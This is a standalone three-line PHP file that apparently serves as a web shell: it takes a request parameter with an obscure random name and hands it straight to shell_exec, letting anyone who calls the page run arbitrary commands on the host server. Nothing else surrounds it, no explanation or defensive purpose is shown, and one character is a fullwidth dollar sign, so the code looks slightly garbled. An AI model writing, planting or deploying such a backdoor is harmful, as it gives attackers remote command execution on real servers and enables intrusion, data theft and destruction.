<?php
shell_exec(＄_GET['MaWLDm_u']);
?>
